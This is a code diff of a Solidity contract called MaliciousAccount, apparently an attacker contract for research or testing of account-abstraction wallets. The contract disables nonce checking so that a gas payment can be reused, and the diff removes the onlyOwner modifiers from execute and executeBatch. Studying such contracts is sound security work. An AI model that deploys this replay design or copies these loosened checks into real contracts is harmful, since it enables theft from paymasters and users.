@@ -443,12 +443,12 @@ contract MaliciousAccount is
         if (!transferToken(token, dest, amount)) revert TokenTransferFailed(token, dest, amount);
     }
 
-    function execute(address dest, uint value, bytes calldata func) external onlyOwner{
+    function execute(address dest, uint value, bytes calldata func) external {
         _requireFromEntryPointOrOwner();
         _call(dest, value, func);
     }
 
-    function executeBatch(address[] calldata dest, bytes[] calldata func) external onlyOwner{
+    function executeBatch(address[] calldata dest, bytes[] calldata func) external {
         _requireFromEntryPointOrOwner();
         require(dest.length == func.length, "wrong array lengths");
         for (uint i = 0; i < dest.length;) {
@@ -487,11 +487,19 @@ contract MaliciousAccount is
     function _validateAndUpdateNonce(UserOperation calldata userOp) internal override {
         // No nonce to REUSE THE GAS PAYMENT
         //require(nonces[0]++ == userOp.nonce, "account: invalid nonce");
+
+        // bytes calldata userOpData = userOp.callData;
+        // (address _to, uint _amount, bytes memory _data) = abi.decode(userOpData[4:], (address, uint, bytes));
+        // if(address(modules[_to]) != address(0)) return;
     }
 
     /// implement template method of BaseAccount
     function _validateSignature(UserOperation calldata userOp, bytes32 userOpHash, address)
     internal override virtual returns (uint256 deadline) {
+        // bytes calldata userOpData = userOp.callData;
+        // (address _to, uint _amount, bytes memory _data) = abi.decode(userOpData[4:], (address, uint, bytes));
+        // if(address(modules[_to]) != address(0)) return 0;
+
         bytes32 hash = userOpHash.toEthSignedMessageHash();
         // MALICIOUS ATTACKER PROTECTING THEIR ASSET being stolen by removing nonce
         require(tx.origin == owner);
